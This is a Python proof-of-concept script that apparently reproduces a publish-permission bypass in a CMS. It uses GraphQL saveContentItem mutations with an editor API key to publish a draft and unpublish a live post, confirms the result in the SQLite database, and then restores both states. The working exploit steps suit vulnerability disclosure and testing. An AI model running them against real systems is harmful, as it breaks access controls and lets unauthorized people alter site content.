#!/usr/bin/env python3
"""CK-002 harness: GraphQL saveContentItem publish-permission bypass.
Prereqs: fixtures from live-repro/setup_fixtures.py + editor-key-12345
(system API key with role 'editor': content/posts read/create/update,
NO publish permission). Draft item starts unpublished (_state=0).
Control: REST POST /api/content/item/posts with _state=1 -> state stripped.
Attack: GraphQL saveContentItem mutation with _state -> state applied.
State verified directly in the SQLite content database after each step.
"""
import sys, json, sqlite3
sys.path.insert(0, '../../live-repro')
from ck import *

fx = json.load(open('../../live-repro/fixtures.json'))
PUB, DRAFT = fx['published_id'], fx['draft_id']
EK, MK = 'editor-key-12345', 'master-key-12345'

def db_state(item_id):
    db = sqlite3.connect('../../src/storage/data/content.sqlite')
    for (doc,) in db.execute('select document from collections_posts'):
        d = json.loads(doc)
        if d['_id'] == item_id:
            return d['_state']

def gql(query, key):
    return api('POST', '/gql', key=key, json={'query': query, 'variables': {}})

ok = True
print('draft _state before:', db_state(DRAFT))
r = api('POST', '/content/item/posts', key=EK, json={'data': {'_id': DRAFT, '_state': 1, 'title': 'Draft Post'}})
print(f'CONTROL REST publish attempt: HTTP {r.status_code}, _state in DB after: {db_state(DRAFT)} (expected 0)')
ok &= db_state(DRAFT) == 0

q = 'mutation { saveContentItem(model: "posts", data: {_id: "%s", _state: 1}) { item error } }' % DRAFT
r = gql(q, EK)
print(f'ATTACK GraphQL publish: HTTP {r.status_code}, _state in DB after: {db_state(DRAFT)} (vulnerable if 1)')
ok &= db_state(DRAFT) == 1

q = 'mutation { saveContentItem(model: "posts", data: {_id: "%s", _state: 0}) { item error } }' % PUB
r = gql(q, EK)
print(f'ATTACK GraphQL unpublish: HTTP {r.status_code}, _state in DB after: {db_state(PUB)} (vulnerable if 0)')
ok &= db_state(PUB) == 0

api('POST', '/content/item/posts', key=MK, json={'data': {'_id': DRAFT, '_state': 0}})
api('POST', '/content/item/posts', key=MK, json={'data': {'_id': PUB, '_state': 1}})
print('states restored (draft=0, pub=1)')
print('VERDICT:', 'VULNERABLE - publish permission bypassed via GraphQL' if ok else 'NOT REPRODUCED')
sys.exit(0 if ok else 1)
